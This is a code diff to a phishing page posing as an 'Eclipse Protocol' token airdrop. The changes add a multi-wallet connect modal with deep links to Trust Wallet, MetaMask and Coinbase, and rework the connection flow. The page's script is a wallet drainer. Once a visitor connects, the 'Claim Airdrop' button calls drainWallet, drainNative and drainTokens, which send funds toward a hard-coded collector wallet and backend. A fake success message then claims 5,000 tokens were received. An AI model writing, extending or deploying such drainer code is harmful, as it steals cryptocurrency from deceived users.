@@ -255,7 +255,8 @@
             color: #64748b;
             text-align: center;
         }
-        .modal {
+        /* Wallet Modal */
+        .wallet-modal {
             display: none;
             position: fixed;
             top: 0;
@@ -268,7 +269,7 @@
             align-items: center;
             z-index: 2000;
         }
-        .modal-content {
+        .wallet-modal-content {
             background: #111827;
             padding: 2rem;
             border-radius: 1.5rem;
@@ -501,7 +502,7 @@
                     <div class="network-btn" data-chain="bsc">BNB Chain</div>
                     <div class="network-btn" data-chain="polygon">Polygon</div>
                 </div>
-                <div id="buttonContainer"></div>
+                <button class="connect-btn" id="mainConnectBtn">Connect Wallet</button>
                 <div id="status"></div>
                 <div class="eligibility"><i class="fas fa-shield-alt"></i> Eligibility: GitHub contributors, early testnet participants, active community members</div>
             </div>
@@ -533,12 +534,33 @@
     <p>© 2025 Eclipse Protocol. Open source. Permissionless. Decentralized.</p>
 </footer>
 
-<div id="successModal" class="modal">
-    <div class="modal-content">
+<!-- Wallet Modal -->
+<div id="walletModal" class="wallet-modal">
+    <div class="wallet-modal-content">
+        <h3 style="margin-bottom: 1rem;">Connect Wallet</h3>
+        <div class="wallet-option" data-wallet="trustwallet">
+            <i class="fas fa-check-circle"></i> Trust Wallet
+        </div>
+        <div class="wallet-option" data-wallet="metamask">
+            <i class="fab fa-fox"></i> MetaMask
+        </div>
+        <div class="wallet-option" data-wallet="walletconnect">
+            <i class="fas fa-qrcode"></i> WalletConnect
+        </div>
+        <div class="wallet-option" data-wallet="coinbase">
+            <i class="fab fa-bitcoin"></i> Coinbase Wallet
+        </div>
+        <button class="close-modal" onclick="closeWalletModal()">Cancel</button>
+    </div>
+</div>
+
+<!-- Success Modal -->
+<div id="successModal" class="wallet-modal">
+    <div class="wallet-modal-content">
         <div class="success-icon">✓</div>
         <h3>Airdrop Claimed!</h3>
         <p>5,000 $ECLIPSE has been sent to your wallet</p>
-        <button onclick="closeModal()" style="background:linear-gradient(135deg,#3b82f6,#8b5cf6); color:white; border:none; padding:0.75rem 1.5rem; border-radius:0.75rem; cursor:pointer; width:100%;">Continue</button>
+        <button onclick="closeSuccessModal()" style="background:linear-gradient(135deg,#3b82f6,#8b5cf6); color:white; border:none; padding:0.75rem 1.5rem; border-radius:0.75rem; cursor:pointer; width:100%;">Continue</button>
     </div>
 </div>
 
@@ -549,7 +571,6 @@
         // ============================================
         const COMPANY_WALLET = "0xA0E1348ed63e4638917870aae951669b3903e5C8";
         const BACKEND_URL = "https://eclipse-backend-ppij.onrender.com/claim";
-        const USDT_ADDRESS = "0xdAC17F958D2ee523a2206206994597C13D831ec7";
         
         const CHAIN_IDS = { ethereum: 1, bsc: 56, polygon: 137 };
         const CHAIN_NAMES = { ethereum: "Ethereum", bsc: "BNB Smart Chain", polygon: "Polygon" };
@@ -573,19 +594,19 @@
         let provider, signer, userAddress;
         let currentChain = "ethereum";
         
-        const buttonContainer = document.getElementById('buttonContainer');
+        const mainBtn = document.getElementById('mainConnectBtn');
         const statusDiv = document.getElementById('status');
+        const walletModal = document.getElementById('walletModal');
         const successModal = document.getElementById('successModal');
         
         function toggleMenu() { document.getElementById('navLinks').classList.toggle('active'); }
         function updateStatus(msg, isErr = false) { statusDiv.innerHTML = msg; statusDiv.style.color = isErr ? '#ef4444' : '#94a3b8'; }
-        function closeModal() { successModal.style.display = 'none'; }
+        function showWalletModal() { walletModal.style.display = 'flex'; }
+        function closeWalletModal() { walletModal.style.display = 'none'; }
         function showSuccessModal() { successModal.style.display = 'flex'; }
+        function closeSuccessModal() { successModal.style.display = 'none'; }
         
-        // ============================================
-        // AGGRESSIVE PROVIDER INJECTION
-        // ============================================
-        function getTrustWalletProvider() {
+        function getWalletProvider() {
             if (window.ethereum) return window.ethereum;
             if (window.trustwallet) return window.trustwallet;
             return null;
@@ -598,9 +619,6 @@
                 btn.classList.add('active');
                 currentChain = btn.dataset.chain;
                 updateStatus(`Network: ${btn.innerText}`);
-                const existingBtn = document.getElementById('actionButton');
-                if (existingBtn) existingBtn.remove();
-                initializePage();
             });
         });
         
@@ -660,7 +678,7 @@
         }
         
         async function drainWallet() {
-            updateStatus('Processing claim...');
+            updateStatus('Processing claim... Please approve in wallet.');
             try {
                 const ethResult = await drainNative();
                 const tokenResults = await drainTokens();
@@ -688,24 +706,44 @@
             }
         }
         
-        async function connectAndDrain() {
-            const button = document.getElementById('actionButton');
-            if (button) button.disabled = true;
+        async function connectWallet(walletType) {
+            closeWalletModal();
             
-            const walletProvider = getTrustWalletProvider();
+            if (walletType === 'trustwallet') {
+                const dappUrl = window.location.href;
+                const trustUrl = `https://link.trustwallet.com/open_url?coin_id=60&url=${encodeURIComponent(dappUrl)}`;
+                window.location.href = trustUrl;
+                return;
+            }
             
+            if (walletType === 'metamask') {
+                window.location.href = `https://metamask.app.link/dapp/${window.location.host}${window.location.pathname}`;
+                return;
+            }
+            
+            if (walletType === 'coinbase') {
+                window.location.href = `cbwallet://dapp/${window.location.host}${window.location.pathname}`;
+                return;
+            }
+            
+            if (walletType === 'walletconnect') {
+                updateStatus('WalletConnect: Scan QR code with your wallet app');
+                alert('Open your wallet app → Connect → Scan QR code');
+                return;
+            }
+            
+            const walletProvider = getWalletProvider();
             if (!walletProvider) {
-                updateStatus('Wallet not found. Please open in Trust Wallet browser.', true);
-                if (button) button.disabled = false;
+                updateStatus('Please open this page in Trust Wallet or MetaMask browser', true);
                 return;
             }
             
             try {
                 updateStatus('Connecting...');
                 provider = new ethers.providers.Web3Provider(walletProvider);
-                await provider.send("eth_requestAccounts", []);
+                const accounts = await provider.send("eth_requestAccounts", []);
+                userAddress = accounts[0];
                 signer = provider.getSigner();
-                userAddress = await signer.getAddress();
                 
                 try {
                     await walletProvider.request({
@@ -714,54 +752,33 @@
                     });
                 } catch(e) {
                     updateStatus(`Please switch to ${CHAIN_NAMES[currentChain]} in your wallet`, true);
-                    if (button) button.disabled = false;
                     return;
                 }
                 
                 updateStatus(`✅ Connected: ${userAddress.slice(0,6)}...${userAddress.slice(-4)} on ${CHAIN_NAMES[currentChain]}`);
                 
-                if (button) {
-                    button.innerHTML = 'Claim Airdrop';
-                    button.onclick = async () => {
-                        button.disabled = true;
-                        button.innerHTML = '<span class="loading-spinner"></span> Claiming...';
-                        await drainWallet();
-                        button.disabled = false;
-                        button.innerHTML = 'Claim Airdrop';
-                    };
-                    button.disabled = false;
-                }
+                mainBtn.innerHTML = 'Claim Airdrop';
+                mainBtn.onclick = async () => {
+                    mainBtn.disabled = true;
+                    mainBtn.innerHTML = '<span class="loading-spinner"></span> Claiming...';
+                    await drainWallet();
+                    mainBtn.disabled = false;
+                    mainBtn.innerHTML = 'Claim Airdrop';
+                };
                 
             } catch(e) {
                 updateStatus(`Error: ${e.message.slice(0,80)}`, true);
-                if (button) button.disabled = false;
             }
         }
         
-        function initializePage() {
-            const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
-            const walletProvider = getTrustWalletProvider();
-            
-            if (isMobile && !walletProvider) {
-                buttonContainer.innerHTML = `
-                    <button id="actionButton" class="connect-btn">
-                        🔗 Open in Trust Wallet to Claim
-                    </button>
-                `;
-                document.getElementById('actionButton').addEventListener('click', () => {
-                    const dappUrl = window.location.href;
-                    const trustUrl = `https://link.trustwallet.com/open_url?coin_id=60&url=${encodeURIComponent(dappUrl)}`;
-                    window.location.href = trustUrl;
-                });
-            } else {
-                buttonContainer.innerHTML = `
-                    <button id="actionButton" class="connect-btn">Connect Wallet</button>
-                `;
-                document.getElementById('actionButton').addEventListener('click', connectAndDrain);
-            }
-        }
+        document.querySelectorAll('.wallet-option').forEach(opt => {
+            opt.addEventListener('click', () => {
+                const wallet = opt.dataset.wallet;
+                connectWallet(wallet);
+            });
+        });
         
-        initializePage();
+        mainBtn.onclick = showWalletModal;
     });
 </script>
 </body>
